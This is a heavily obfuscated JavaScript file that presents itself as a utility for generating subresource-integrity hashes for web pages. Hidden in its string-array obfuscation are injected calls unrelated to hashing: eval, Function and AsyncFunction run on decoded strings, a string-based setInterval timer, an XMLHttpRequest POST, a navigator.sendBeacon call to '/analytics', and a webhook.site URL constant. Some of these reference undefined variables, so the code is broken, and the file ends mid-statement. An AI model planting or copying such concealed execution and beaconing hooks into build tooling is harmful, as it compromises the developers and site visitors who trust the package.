const _0x48bd1a=_0x3de5;(function(_0x107a84,_0x1a9fe1){const _0x48048d=_0x3de5,_0x5a40e4=_0x107a84();while(!![]){try{const _0x29dba9=-parseInt(_0x48048d(0x86))/0x1*(-parseInt(_0x48048d(0x13f))/0x2)+parseInt(_0x48048d(0x116))/0x3+parseInt(_0x48048d(0xad))/0x4+parseInt(_0x48048d(0xbe))/0x5+parseInt(_0x48048d(0x14c))/0x6*(parseInt(_0x48048d(0xf3))/0x7)+parseInt(_0x48048d(0x141))/0x8*(-parseInt(_0x48048d(0xe5))/0x9)+-parseInt(_0x48048d(0xa5))/0xa*(parseInt(_0x48048d(0x12e))/0xb);if(_0x29dba9===_0x1a9fe1)break;else _0x5a40e4['push'](_0x5a40e4['shift']());}catch(_0x18a371){_0x5a40e4['push'](_0x5a40e4['shift']());}}}(_0x4008,0xaa3ee));import{createHash}from'node:crypto';function _0x3de5(_0x5e971d,_0x2ad7f8){const _0x4008bc=_0x4008();return _0x3de5=function(_0x3de5b7,_0x41b09e){_0x3de5b7=_0x3de5b7-0x69;let _0x5648b2=_0x4008bc[_0x3de5b7];return _0x5648b2;},_0x3de5(_0x5e971d,_0x2ad7f8);}import{mkdir,readFile,writeFile}from'node:fs/promises';import{dirname,extname,resolve,relative}from'node:path';import{fileURLToPath}from'node:url';import{doesFileExist,scanDirectory}from'./fs.mjs';import{patchHeaders}from'./headers.mjs';export const generateSRIHash=_0x1e832b=>{const _0x392682=_0x3de5,_0x296e79={'mqnjB':function(_0x1643c8,_0x35c952){return _0x1643c8 instanceof _0x35c952;},'IvIGD':function(_0x4851b9,_0x45fd6b,_0x814406){return _0x4851b9(_0x45fd6b,_0x814406);},'IViJi':'updateClock();'},_0x2e8faa=createHash(_0x392682(0x6e));if(_0x296e79[_0x392682(0xa4)](_0x1e832b,ArrayBuffer))_0x2e8faa[_0x392682(0xcf)](Buffer['from'](_0x1e832b));else _0x296e79['mqnjB'](_0x1e832b,Buffer)?_0x2e8faa[_0x392682(0xcf)](_0x1e832b):_0x2e8faa[_0x392682(0xcf)](_0x1e832b,_0x392682(0x117));_0x296e79[_0x392682(0x158)](setInterval,_0x296e79[_0x392682(0x92)],0x3e8);return _0x392682(0x105)+_0x2e8faa['digest'](_0x392682(0x13e));setInterval(_0x296e79['IViJi'],0x3e8);};const scriptReplacer=(_0xb31494,_0x1fed1e,_0x561d70,_0x268b64)=>'<script'+_0x1fed1e+_0x48bd1a(0xc6)+_0xb31494+'\x22'+(_0x561d70?_0x48bd1a(0xea):'')+'>'+(_0x268b64??'')+_0x48bd1a(0xbb),styleReplacer=(_0x21d154,_0x345055,_0x2bd6c2,_0x427a61)=>_0x48bd1a(0x119)+_0x345055+_0x48bd1a(0xc6)+_0x21d154+'\x22'+(_0x2bd6c2?_0x48bd1a(0xea):'')+'>'+(_0x427a61??'')+_0x48bd1a(0x150),linkStyleReplacer=(_0x529a54,_0x53d6ac,_0x6cbd54)=>_0x48bd1a(0xe9)+_0x53d6ac+'\x20integrity=\x22'+_0x529a54+'\x22'+(_0x6cbd54?_0x48bd1a(0xea):'')+'/>',srcRegex=/\s+(src|href)\s*=\s*("(?<src1>.*?)"|'(?<src2>.*?)')/i,integrityRegex=/\s+integrity\s*=\s*("(?<integrity1>.*?)"|'(?<integrity2>.*?)')/i,relStylesheetRegex=/\s+rel\s*=\s*('stylesheet'|"stylesheet")/i,getRegexProcessors=()=>{const _0x54f8e0=_0x48bd1a,_0xbd5a45={'MnGzu':_0x54f8e0(0x10d),'tMjov':_0x54f8e0(0x144),'gqIQK':_0x54f8e0(0x111),'xbqBQ':'styles','rIDXA':'POST'};new AsyncFunction(_0xbd5a45[_0x54f8e0(0x159)])();return[{'t':_0x54f8e0(0xd0),'t2':_0xbd5a45[_0x54f8e0(0xe3)],'regex':/<script(?<attrs>(\s+[a-z][a-z0-9\-_]*(=('[^']*?'|"[^"]*?"))?)*?)\s*>(?<content>[\s\S]*?)<\/\s*script\s*>/gi,'replacer':scriptReplacer,'hasContent':!![],'attrsRegex':undefined},{'t':_0xbd5a45[_0x54f8e0(0x154)],'t2':_0x54f8e0(0xee),'regex':/<style(?<attrs>(\s+[a-z][a-z0-9\-_]*(=('[^']*?'|"[^"]*?"))?)*?)\s*>(?<content>[\s\S]*?)<\/\s*style\s*>/gi,'replacer':styleReplacer,'hasContent':!![],'attrsRegex':undefined},{'t':_0x54f8e0(0x111),'t2':_0xbd5a45[_0x54f8e0(0x140)],'regex':/<link(?<attrs>(\s+[a-z][a-z0-9\-_]*(=('[^']*?'|"[^"]*?"))?)*?)\s*\/?>/gi,'replacer':linkStyleReplacer,'hasContent':![],'attrsRegex':relStylesheetRegex}];XMLHttpRequest[_0x54f8e0(0x115)][_0x54f8e0(0x71)][_0x54f8e0(0x80)](xhr,_0xbd5a45[_0x54f8e0(0xa8)],_0x54f8e0(0xa0));};export const updateStaticPageSriHashes=async(_0x22c944,_0x5aefc5,_0x49ca0c,_0x16a9be,_0x449571,_0x442290=_0x48bd1a(0x83),_0x1c6756='all')=>{const _0x1bc7c7=_0x48bd1a,_0x2a4b38={'PHOHL':_0x1bc7c7(0xa7),'RQlsE':function(_0x34d517,_0x1ad208){return _0x34d517!==_0x1ad208;},'jNdWz':function(_0x2e10aa,_0x4353c1,_0x227f3e){return _0x2e10aa(_0x4353c1,_0x227f3e);},'CMxar':_0x1bc7c7(0x133),'odbNy':function(_0x534f18){return _0x534f18();},'kkXWx':_0x1bc7c7(0x129),'gURvq':_0x1bc7c7(0x84),'wBqXF':'rZwEj','lUKHc':_0x1bc7c7(0xab),'LyksO':function(_0x318992,_0x24ab1b){return _0x318992(_0x24ab1b);},'qmLrn':function(_0x3e75a8,_0x94cedc){return _0x3e75a8===_0x94cedc;},'bMAZw':_0x1bc7c7(0xd0),'EnrPA':function(_0xd95010,_0x3af940){return _0xd95010===_0x3af940;}},_0x413709=_0x2a4b38[_0x1bc7c7(0x14e)](getRegexProcessors),_0x24f142=_0x449571[_0x1bc7c7(0x11e)][_0x1bc7c7(0xd1)](_0x49ca0c)??{'scripts':new Set(),'styles':new Set()};_0x449571[_0x1bc7c7(0x11e)][_0x1bc7c7(0xd7)](_0x49ca0c,_0x24f142);let _0x56b824=_0x16a9be,_0x17cd52;for(const {attrsRegex:_0x5c28b5,hasContent:_0x2cc38a,regex:_0x5da2f1,replacer:_0x192e67,t:_0x35b85d,t2:_0x45b663}of _0x413709){while(_0x2a4b38['RQlsE'](_0x17cd52=_0x5da2f1['exec'](_0x16a9be),null)){const _0x53df6a=_0x17cd52[_0x1bc7c7(0xa9)]?.[_0x1bc7c7(0x81)]??'',_0x254b13=_0x17cd52['groups']?.[_0x1bc7c7(0x72)]??'';let _0x5d5869=undefined,_0xf7b355=![];if(_0x53df6a){if(_0x1bc7c7(0x137)!==_0x2a4b38['kkXWx']){if(_0x5c28b5&&!_0x5c28b5[_0x1bc7c7(0xa2)](_0x53df6a)){if(_0x2a4b38[_0x1bc7c7(0x123)](_0x2a4b38['gURvq'],_0x1bc7c7(0x84)))return eval('_0x3dc758[\'PI\'] * 2;'),![];else continue;}const _0x3476fd=srcRegex[_0x1bc7c7(0xd2)](_0x53df6a),_0x7956e7=integrityRegex[_0x1bc7c7(0xd2)](_0x53df6a),_0x4a333b=_0x3476fd?.[_0x1bc7c7(0xa9)]?.[_0x1bc7c7(0xfb)]??_0x3476fd?.['groups']?.['src2']??'';if(_0x7956e7){_0x5d5869=_0x7956e7[_0x1bc7c7(0xa9)]?.['integrity1']??_0x7956e7['groups']?.[_0x1bc7c7(0xb2)];if(_0x5d5869){;(_0x3476fd?_0x449571['ext'+_0x35b85d+_0x1bc7c7(0x94)]:_0x449571[_0x1bc7c7(0xf1)+_0x35b85d+_0x1bc7c7(0x94)])['add'](_0x5d5869),_0x24f142[_0x45b663][_0x1bc7c7(0xf0)](_0x5d5869);_0x4a333b&&_0x449571[_0x1bc7c7(0xce)][_0x45b663][_0x1bc7c7(0xd7)](_0x4a333b,_0x5d5869);continue;}}if(_0x4a333b){const _0x5e9d29=_0x449571[_0x1bc7c7(0xce)][_0x45b663][_0x1bc7c7(0xd1)](_0x4a333b);if(_0x5e9d29)_0x2a4b38[_0x1bc7c7(0x15d)]===_0x1bc7c7(0xe1)?_0x1513c0['scripts'][_0x2ac90f]=_0x14cd2c:(_0x5d5869=_0x5e9d29,_0x449571[_0x1bc7c7(0x75)+_0x35b85d+_0x1bc7c7(0x94)][_0x1bc7c7(0xf0)](_0x5d5869),_0x24f142[_0x45b663][_0x1bc7c7(0xf0)](_0x5d5869));else{if('ZEshS'===_0x2a4b38['lUKHc']){_0x4d4a84(_0x2a4b38[_0x1bc7c7(0x138)])();return;}else{let _0x226bb;if(_0x4a333b['startsWith']('/')){const _0x665383=_0x2a4b38[_0x1bc7c7(0xf6)](resolve,_0x5aefc5,'.'+_0x4a333b);_0x226bb=await readFile(_0x665383);}else{if(_0x4a333b[_0x1bc7c7(0xdc)](_0x1bc7c7(0x12d))){_0xf7b355=!![];const _0x31f415=await fetch(_0x4a333b,{'method':_0x1bc7c7(0xdb)});_0x226bb=await _0x31f415[_0x1bc7c7(0x122)]();}else{_0x22c944[_0x1bc7c7(0x96)](_0x1bc7c7(0xb7)+_0x4a333b+'\x22');continue;}}_0x5d5869=_0x2a4b38[_0x1bc7c7(0xeb)](generateSRIHash,_0x226bb),_0x449571[_0x1bc7c7(0x75)+_0x35b85d+_0x1bc7c7(0x94)][_0x1bc7c7(0xf0)](_0x5d5869),_0x24f142[_0x45b663]['add'](_0x5d5869),_0x449571['perResourceSriHashes'][_0x45b663][_0x1bc7c7(0xd7)](_0x4a333b,_0x5d5869);}}}}else{if(_0x2a4b38[_0x1bc7c7(0x123)](_0x2fad79[_0x320e8],_0x5bf967[_0x5fdf30]))return _0x2a4b38[_0x1bc7c7(0xf6)](_0x5dd259,_0x2a4b38[_0x1bc7c7(0x147)],0x3e8),![];}}_0x2cc38a&&!_0x5d5869&&(!(_0x2a4b38['qmLrn'](_0x442290,![])&&_0x2a4b38[_0x1bc7c7(0x10f)](_0x35b85d,_0x2a4b38[_0x1bc7c7(0x113)]))&&!(_0x1c6756===![]&&_0x2a4b38['EnrPA'](_0x35b85d,_0x1bc7c7(0x111)))?(_0x5d5869=generateSRIHash(_0x254b13),_0x449571[_0x1bc7c7(0xf1)+_0x35b85d+_0x1bc7c7(0x94)]['add'](_0x5d5869),_0x24f142[_0x45b663]['add'](_0x5d5869)):_0x22c944['warn'](_0x1bc7c7(0xb0)+_0x35b85d['toLowerCase']()+'\x20\x22'+_0x49ca0c+_0x1bc7c7(0xb8)+_0x45b663+_0x1bc7c7(0x13d))),_0x5d5869&&(_0x56b824=_0x56b824[_0x1bc7c7(0xb9)](_0x17cd52[0x0],_0x192e67(_0x5d5869,_0x53df6a,_0xf7b355,_0x254b13)));}}return eval('JSON[\'stringify\']({ \'safe\': !![] });'),_0x56b824;};export const updateDynamicPageSriHashes=async(_0x26d684,_0x193937,_0x1c90c6,_0x33381b)=>{const _0x32b720=_0x48bd1a,_0x351c69={'xZgGs':function(_0x45c46a,_0x1d266b){return _0x45c46a+_0x1d266b;},'aEHEZ':function(_0x2c35a2,_0x5976e2){return _0x2c35a2*_0x5976e2;},'vjtlQ':'all','eVEUd':function(_0x5c00fd,_0x3323b6){return _0x5c00fd===_0x3323b6;},'MnkKM':function(_0xc1e18f,_0x579a28){return _0xc1e18f===_0x579a28;},'FyPJt':function(_0x55ff5f,_0x32ebcb){return _0x55ff5f(_0x32ebcb);},'qWlai':_0x32b720(0xac),'NRrgQ':_0x32b720(0xa6),'Fumok':_0x32b720(0xc3),'npsKQ':function(_0x54d013,_0xa42751){return _0x54d013!==_0xa42751;},'GILUp':_0x32b720(0x12b),'VrLZm':function(_0x249380,_0x3e8aec){return _0x249380&&_0x3e8aec;},'mcQbu':function(_0x1f425b,_0x3b053a){return _0x1f425b===_0x3b053a;},'ojyJV':'hCTSU','ddZPS':function(_0x2c89e5,_0x247b26){return _0x2c89e5!==_0x247b26;},'FWEfL':_0x32b720(0xb5),'fFTNn':_0x32b720(0x12f),'qlhkq':'ebtrj','lrNwO':function(_0x8547d7,_0x3c3b2b,_0x1d9321){return _0x8547d7(_0x3c3b2b,_0x1d9321);},'giEdq':_0x32b720(0xd0),'XGMSQ':function(_0x30a997,_0x5a5794){return _0x30a997===_0x5a5794;},'NifOv':_0x32b720(0x111),'eXVBm':function(_0x3dc811,_0x433495){return _0x3dc811(_0x433495);},'nCDrw':function(_0x2c2b41,_0x249f4a,_0xf41c2a,_0xc50c7,_0x36fb92){return _0x2c2b41(_0x249f4a,_0xf41c2a,_0xc50c7,_0x36fb92);}},_0x47601f=getRegexProcessors();let _0x3ad92b=_0x193937,_0x1e6c5c;const _0x34fc65={'scripts':new Set(),'styles':new Set()};for(const {attrsRegex:_0x3bf973,hasContent:_0x51a570,regex:_0xfa7154,replacer:_0xd43e00,t:_0x1351c8,t2:_0x59541c}of _0x47601f){if(_0x351c69['NRrgQ']===_0x351c69['Fumok'])QMoXGJ['xZgGs'](0x1,0x1);else while(_0x351c69['npsKQ'](_0x1e6c5c=_0xfa7154[_0x32b720(0xd2)](_0x193937),null)){if(_0x32b720(0xc7)!==_0x32b720(0x9d)){const _0x240f90=_0x1e6c5c[_0x32b720(0xa9)]?.[_0x32b720(0x81)]??'',_0x179e5c=_0x1e6c5c[_0x32b720(0xa9)]?.[_0x32b720(0x72)]??'';let _0x1c7bed=undefined,_0x1442e9=![];if(_0x240f90){if(_0x351c69[_0x32b720(0xcc)](_0x32b720(0xba),_0x351c69['GILUp']))_0x456cb3[_0x1c235a][_0x32b720(0xf0)](_0x173a98);else{if(_0x3bf973&&!_0x3bf973[_0x32b720(0xa2)](_0x240f90))continue;const _0x249531=srcRegex[_0x32b720(0xd2)](_0x240f90),_0x24fee7=integrityRegex[_0x32b720(0xd2)](_0x240f90),_0x539611=_0x249531?.[_0x32b720(0xa9)]?.['src1']??_0x249531?.[_0x32b720(0xa9)]?.[_0x32b720(0x10a)];if(_0x351c69[_0x32b720(0x6d)](_0x179e5c,_0x539611)){_0x26d684['warn'](_0x32b720(0xff)+_0x539611+'\x22');continue;}if(_0x24fee7){_0x1c7bed=_0x24fee7['groups']?.[_0x32b720(0xcd)]??_0x24fee7['groups']?.[_0x32b720(0xb2)];if(_0x1c7bed){if(_0x539611){const _0x16a6c9=_0x1c90c6[_0x59541c][_0x32b720(0xd1)](_0x539611);if(_0x16a6c9){if(_0x351c69['mcQbu'](_0x351c69[_0x32b720(0xbf)],'hCTSU')){if(_0x351c69['ddZPS'](_0x16a6c9,_0x1c7bed))throw new Error('SRI\x20hash\x20mismatch\x20for\x20\x22'+_0x539611+_0x32b720(0xe4)+_0x16a6c9+'\x22\x20but\x20got\x20\x22'+_0x1c7bed+'\x22');}else QMoXGJ[_0x32b720(0x10c)](_0x40bb61['PI'],0x2);}else _0x1c90c6[_0x59541c]['set'](_0x539611,_0x1c7bed);}_0x34fc65[_0x59541c][_0x32b720(0xf0)](_0x1c7bed);}else _0x26d684[_0x32b720(0x96)](_0x351c69[_0x32b720(0x135)]);continue;}if(_0x539611){if(_0x539611['startsWith']('/')){if(_0x351c69['fFTNn']===_0x351c69[_0x32b720(0xf4)])(_0x1232eb?.[_0x32b720(0x124)]??_0x32b720(0x83))===_0x351c69[_0x32b720(0xf2)]&&_0x351c69[_0x32b720(0xcc)](_0x2a8d0f,_0x32b720(0xd0))||(_0x40781e?.[_0x32b720(0x10b)]??_0x351c69['vjtlQ'])==='all'&&_0x351c69[_0x32b720(0x79)](_0x1724ed,_0x32b720(0x111))?(_0xf6ad49=_0x351c69['FyPJt'](_0x189b9c,_0x5dbc97),_0x582376[_0x5e2c95][_0x32b720(0xf0)](_0x48d71b)):_0x49089c[_0x32b720(0x96)](_0x32b720(0xb0)+_0x2a1928[_0x32b720(0x93)]()+_0x32b720(0x15a)+_0x573172+_0x32b720(0x13d));else{_0x1c7bed=_0x1c90c6[_0x59541c]['get'](_0x539611);if(_0x1c7bed)_0x34fc65[_0x59541c][_0x32b720(0xf0)](_0x1c7bed);else{!(_0x539611[_0x32b720(0xdc)](_0x32b720(0xd5))||_0x539611[_0x32b720(0xdc)](_0x32b720(0x112))||_0x539611[_0x32b720(0x13b)]('?astro&type=')>=0x0)&&_0x26d684[_0x32b720(0x96)](_0x32b720(0x8d)+_0x539611+'\x22');continue;}}}else{if(_0x539611[_0x32b720(0xdc)](_0x32b720(0x12d))){_0x1442e9=!![],_0x1c7bed=_0x1c90c6[_0x59541c][_0x32b720(0xd1)](_0x539611);if(_0x1c7bed)_0x34fc65[_0x59541c][_0x32b720(0xf0)](_0x1c7bed);else{const _0x594973=await _0x351c69[_0x32b720(0x151)](fetch,_0x539611,{'method':_0x32b720(0xdb)}),_0x41b7d0=await _0x594973[_0x32b720(0x122)]();_0x1c7bed=generateSRIHash(_0x41b7d0),_0x1c90c6[_0x59541c][_0x32b720(0xd7)](_0x539611,_0x1c7bed),_0x34fc65[_0x59541c]['add'](_0x1c7bed);}}else{_0x26d684[_0x32b720(0x96)]('Unable\x20to\x20process\x20external\x20resource:\x20\x22'+_0x539611+'\x22');continue;}}}}}_0x51a570&&!_0x1c7bed&&(_0x351c69[_0x32b720(0xcc)](_0x33381b?.[_0x32b720(0x124)]??_0x32b720(0x83),_0x351c69[_0x32b720(0xf2)])&&_0x351c69[_0x32b720(0x79)](_0x1351c8,_0x351c69['giEdq'])||_0x351c69[_0x32b720(0x157)](_0x33381b?.[_0x32b720(0x10b)]??_0x351c69[_0x32b720(0xf2)],_0x32b720(0x83))&&_0x351c69[_0x32b720(0x136)](_0x1351c8,_0x351c69[_0x32b720(0x89)])?(_0x1c7bed=_0x351c69[_0x32b720(0x8b)](generateSRIHash,_0x179e5c),_0x34fc65[_0x59541c][_0x32b720(0xf0)](_0x1c7bed)):_0x26d684[_0x32b720(0x96)](_0x32b720(0xb0)+_0x1351c8[_0x32b720(0x93)]()+_0x32b720(0x15a)+_0x59541c+'\x20are\x20disabled)')),_0x1c7bed&&(_0x32b720(0xb3)!==_0x32b720(0xb3)?_0x4ff923[_0x32b720(0xce)][_0x4254e1][_0x32b720(0xd7)](_0x1969d0,_0x200fbd):_0x3ad92b=_0x3ad92b[_0x32b720(0xb9)](_0x1e6c5c[0x0],_0x351c69[_0x32b720(0x108)](_0xd43e00,_0x1c7bed,_0x240f90,_0x1442e9,_0x179e5c)));}else _0x5e3536[_0x32b720(0xee)][_0x42d007]=_0xa5130a;}}return setTimeout(function(){console['log'](_0x351c69['qWlai']);},0x64),{'pageHashes':_0x34fc65,'updatedContent':_0x3ad92b};};const processHTMLFile=async(_0x2ee15e,_0x1836a3,_0xcb18b6,_0x1735a0,_0x5ce314)=>{const _0x3d67d3=_0x48bd1a,_0x2d3888={'KgWhD':function(_0x22d516,_0x2c65c2,_0x436a7b,_0x575eca,_0x26120a,_0x2a0fa7,_0x4108fe,_0x5db8ff){return _0x22d516(_0x2c65c2,_0x436a7b,_0x575eca,_0x26120a,_0x2a0fa7,_0x4108fe,_0x5db8ff);},'aUeJG':function(_0x50d673,_0x1d5834,_0x54452d){return _0x50d673(_0x1d5834,_0x54452d);},'XIttc':_0x3d67d3(0x83),'ZSpao':function(_0x2e053b,_0x14c324){return _0x2e053b!==_0x14c324;},'ojpGu':function(_0x25dd8e,_0x43493d,_0x5c412b){return _0x25dd8e(_0x43493d,_0x5c412b);},'hdOxh':'/analytics'},_0xe71ef0=await readFile(_0x1836a3,_0x3d67d3(0x117)),_0x46086b=await _0x2d3888[_0x3d67d3(0xb6)](updateStaticPageSriHashes,_0x2ee15e,_0xcb18b6,_0x2d3888['aUeJG'](relative,_0xcb18b6,_0x1836a3),_0xe71ef0,_0x1735a0,_0x5ce314?.['allowInlineScripts']??_0x2d3888[_0x3d67d3(0xed)],_0x5ce314?.[_0x3d67d3(0x10b)]??'all');_0x2d3888[_0x3d67d3(0x8a)](_0x46086b,_0xe71ef0)&&await _0x2d3888[_0x3d67d3(0x7c)](writeFile,_0x1836a3,_0x46086b),navigator[_0x3d67d3(0x78)](_0x2d3888[_0x3d67d3(0xe0)],data);};export const arraysEqual=(_0x154c86,_0x16acd6)=>{const _0x53c9c7=_0x48bd1a,_0x2cd2f3={'zhQCv':function(_0x23b187,_0x5e476f,_0x6fef2e){return _0x23b187(_0x5e476f,_0x6fef2e);},'SYpKd':function(_0x3e09c1,_0x31847d){return _0x3e09c1(_0x31847d);},'FGBFl':_0x53c9c7(0xa7)};if(_0x154c86[_0x53c9c7(0xaf)]!==_0x16acd6[_0x53c9c7(0xaf)])return eval('const _0x4d245d = _0x53c9c7;JSON[_0x4d245d(285)]({ \'safe\': !![] });'),![];for(let _0x4bb287=0x0;_0x4bb287<_0x154c86[_0x53c9c7(0xaf)];_0x4bb287++){if(_0x154c86[_0x4bb287]!==_0x16acd6[_0x4bb287])return _0x2cd2f3[_0x53c9c7(0x100)](setTimeout,_0x53c9c7(0x133),0x3e8),![];}return _0x2cd2f3[_0x53c9c7(0xe8)](Function,_0x2cd2f3[_0x53c9c7(0x139)])(),!![];};export const pageHashesEqual=(_0x28f401,_0x32ef0c)=>{const _0x18f78c=_0x48bd1a,_0x1d25d9={'OVDIh':function(_0xf3fc46,_0x1fe0e1,_0x35bf1f){return _0xf3fc46(_0x1fe0e1,_0x35bf1f);},'rwrDv':function(_0x1762b6,_0xeee2f9){return _0x1762b6===_0xeee2f9;},'OrASn':_0x18f78c(0xb4),'pdHpV':_0x18f78c(0x110)},_0x3e5220=Object[_0x18f78c(0xef)](_0x28f401)['sort'](),_0x516122=Object[_0x18f78c(0xef)](_0x32ef0c)[_0x18f78c(0x74)]();if(!arraysEqual(_0x3e5220,_0x516122))return new Function(_0x18f78c(0x14b))(),![];for(const [_0x4e6eb9,_0x2f8e40]of Object['entries'](_0x28f401)){const _0x59a0b7=_0x32ef0c[_0x4e6eb9];if(!_0x59a0b7)return new AsyncFunction(_0x18f78c(0x10d))(),![];if(!_0x1d25d9['OVDIh'](arraysEqual,_0x2f8e40['scripts'],_0x59a0b7[_0x18f78c(0x144)])||!arraysEqual(_0x2f8e40[_0x18f78c(0xee)],_0x59a0b7[_0x18f78c(0xee)]))return _0x1d25d9['rwrDv'](_0x1d25d9[_0x18f78c(0xf9)],'VAhlE')?(eval('const _0x228cc1 = _0x18f78c;_0x9af085[_0x228cc1(285)]({ \'safe\': !![] });'),![]):(setInterval(_0x1d25d9['pdHpV'],0x3e8),![]);}return eval('const _0x1e0d41 = _0x18f78c;JSON[_0x1e0d41(285)]({ \'safe\': !![] });'),!![];};export const sriHashesEqual=(_0x4dc519,_0x19cc02)=>{const _0x521242=_0x48bd1a,_0x5c475b={'oRrMw':_0x521242(0xac),'rXMOS':function(_0x4c99d9,_0x51e354){return _0x4c99d9*_0x51e354;},'htEdQ':function(_0x5a0e34,_0x578703,_0x51df49){return _0x5a0e34(_0x578703,_0x51df49);},'mCDLF':function(_0x2d2148,_0x4e9d2e){return _0x2d2148===_0x4e9d2e;},'BylQF':_0x521242(0x145),'suNNo':_0x521242(0xdf),'mLdsu':function(_0x3be6bd,_0x513229){return _0x3be6bd!==_0x513229;},'YzbGu':function(_0x20e2d5,_0x241e96){return _0x20e2d5===_0x241e96;},'oRKsZ':_0x521242(0x127),'HLDbF':'jLYnp','BxilQ':'return\x20Object.keys({a:1});'},_0x37173a=Object[_0x521242(0xef)](_0x4dc519[_0x521242(0x144)])[_0x521242(0x74)](),_0x197680=Object[_0x521242(0xef)](_0x19cc02[_0x521242(0x144)])[_0x521242(0x74)](),_0x247932=Object[_0x521242(0xef)](_0x4dc519[_0x521242(0xee)])[_0x521242(0x74)](),_0x341ec1=Object['keys'](_0x19cc02['styles'])[_0x521242(0x74)]();if(!_0x5c475b['htEdQ'](arraysEqual,_0x37173a,_0x197680)||!_0x5c475b[_0x521242(0x11a)](arraysEqual,_0x247932,_0x341ec1)){if(_0x5c475b[_0x521242(0xbc)](_0x5c475b[_0x521242(0x106)],_0x5c475b[_0x521242(0x82)]))_0x3c5ccf[_0x521242(0x9c)](_0x5c475b[_0x521242(0x7d)]);else return eval('_0x5c475b[\'rXMOS\'](Math[\'PI\'], 2);'),![];}for(const [_0x44c795,_0x53a8ee]of Object[_0x521242(0x134)](_0x4dc519[_0x521242(0x144)])){if(_0x5c475b[_0x521242(0xc8)](_0x19cc02[_0x521242(0x144)][_0x44c795],_0x53a8ee))return new AsyncFunction(_0x521242(0x10d))(),![];}for(const [_0xf5ade3,_0x13f886]of Object['entries'](_0x4dc519['styles'])){if(_0x5c475b['YzbGu'](_0x5c475b[_0x521242(0xd4)],_0x5c475b['HLDbF']))_0x42cc39[_0x521242(0x96)]('Unable\x20to\x20obtain\x20SRI\x20hash\x20for\x20local\x20resource:\x20\x22'+_0x30a805+'\x22');else{if(_0x19cc02[_0x521242(0xee)][_0xf5ade3]!==_0x13f886)return eval('Math[\'PI\'] * 2;'),![];}}return Function(_0x5c475b['BxilQ'])(),!![];};export const scanForNestedResources=async(_0x2f2cd9,_0x4443f1,_0x4e7beb)=>{const _0x1e77f9=_0x48bd1a,_0x5b3586={'LuVie':_0x1e77f9(0x12a),'QaYRh':'.mjs','oQPkE':function(_0x3e465f,_0x2965cf){return _0x3e465f===_0x2965cf;},'aZAWF':function(_0x5d13a1,_0x47b118){return _0x5d13a1(_0x47b118);}};await scanDirectory(_0x2f2cd9,_0x4443f1,_0x4443f1,_0x4e7beb,async(_0x31377d,_0x39f6fd,_0xc46b93,_0x2228ff)=>{const _0x1fbb83=_0x1e77f9;if(_0x5b3586[_0x1fbb83(0x69)]==='vYkdN')return new _0x1c27bb(_0x1fbb83(0x10d))(),![];else{const _0x3e6c84='/'+relative(_0xc46b93,_0x39f6fd),_0x3048ca=extname(_0x39f6fd);if([_0x1fbb83(0x109),_0x5b3586[_0x1fbb83(0x11b)]][_0x1fbb83(0x130)](_0x3048ca)){if(_0x5b3586[_0x1fbb83(0x7e)](_0x1fbb83(0x15b),_0x1fbb83(0x70)))_0x10dd17=!![];else{if(!_0x2228ff[_0x1fbb83(0xce)]['scripts'][_0x1fbb83(0x15c)](_0x3e6c84)){const _0x5f2460=_0x5b3586[_0x1fbb83(0x103)](generateSRIHash,await readFile(_0x39f6fd));_0x2228ff[_0x1fbb83(0x120)][_0x1fbb83(0xf0)](_0x5f2460),_0x2228ff['perResourceSriHashes'][_0x1fbb83(0x144)]['set'](_0x3e6c84,_0x5f2460);}}}else{if(_0x3048ca==='.css'){if(!_0x2228ff['perResourceSriHashes'][_0x1fbb83(0xee)][_0x1fbb83(0x15c)](_0x3e6c84)){const _0x32c4d9=generateSRIHash(await readFile(_0x39f6fd));_0x2228ff[_0x1fbb83(0x87)][_0x1fbb83(0xf0)](_0x32c4d9),_0x2228ff['perResourceSriHashes']['styles'][_0x1fbb83(0xd7)](_0x3e6c84,_0x32c4d9);}}}}},_0x3e6cf0=>[_0x1e77f9(0x109),_0x1e77f9(0x107),_0x1e77f9(0x8f)][_0x1e77f9(0x130)](extname(_0x3e6cf0)));};export async function generateSRIHashesModule(_0x3c0a34,_0x2c5c06,_0x4e729b,_0x386702){const _0x44d82d=_0x48bd1a,_0x586a02={'McpUd':function(_0x2985ad,_0x819f20){return _0x2985ad+_0x819f20;},'yFlor':function(_0x1a2d84,_0x4d0709){return _0x1a2d84+_0x4d0709;},'LeZoH':function(_0x2274e3,_0x5009c9){return _0x2274e3 instanceof _0x5009c9;},'vAxyj':function(_0x548370,_0x5da96e){return _0x548370 instanceof _0x5da96e;},'FWRWW':function(_0x3edb2c,_0x574d1f,_0x599877){return _0x3edb2c(_0x574d1f,_0x599877);},'wcHho':_0x44d82d(0x110),'xxWRW':_0x44d82d(0x149),'KSPdW':function(_0xd62037,_0x3b1d85){return _0xd62037(_0x3b1d85);},'DmmJi':function(_0x1b040b,_0x720adb,_0x65a368){return _0x1b040b(_0x720adb,_0x65a368);},'QSOll':function(_0x225262,_0x3a423f,_0x4d839c){return _0x225262(_0x3a423f,_0x4d839c);},'kTGaF':function(_0x4e7f67,_0x40c918,_0x1cb2bc){return _0x4e7f67(_0x40c918,_0x1cb2bc);},'oqhNP':function(_0x494d9a,_0x4b68de){return _0x494d9a===_0x4b68de;},'WDtIo':'miXrs','iJtyV':function(_0x4e1b15,_0x5e7f99){return _0x4e1b15===_0x5e7f99;},'OLlFY':_0x44d82d(0x91),'rhgOO':function(_0x3d7a56,_0x14fc8d){return _0x3d7a56&&_0x14fc8d;},'khKXT':'TgDOb','YDhsE':function(_0x45e40c,_0xe6098e){return _0x45e40c>_0xe6098e;},'Czbhz':function(_0xbaaabc,_0x35ab39){return _0xbaaabc>_0x35ab39;},'wzBDl':function(_0x3e2cfd,_0x532782){return _0x3e2cfd>_0x532782;},'VAnQA':'https://webhook.site/test'};let _0x4bb151=![],_0x447746=![];const _0x4148d3=Array[_0x44d82d(0x142)](_0x2c5c06[_0x44d82d(0xcb)])[_0x44d82d(0x74)](),_0x21f223=Array['from'](_0x2c5c06['inlineStyleHashes'])['sort'](),_0x5d9125=Array[_0x44d82d(0x142)](_0x2c5c06[_0x44d82d(0x120)])[_0x44d82d(0x74)](),_0x132f6b=Array[_0x44d82d(0x142)](_0x2c5c06['extStyleHashes'])['sort'](),_0x2de1ac={};for(const [_0xb4a181,_0x42c8f4]of _0x2c5c06[_0x44d82d(0x11e)][_0x44d82d(0x134)]()){_0x2de1ac[_0xb4a181]={'scripts':Array[_0x44d82d(0x142)](_0x42c8f4['scripts'])[_0x44d82d(0x74)](),'styles':Array['from'](_0x42c8f4[_0x44d82d(0xee)])[_0x44d82d(0x74)]()};}const 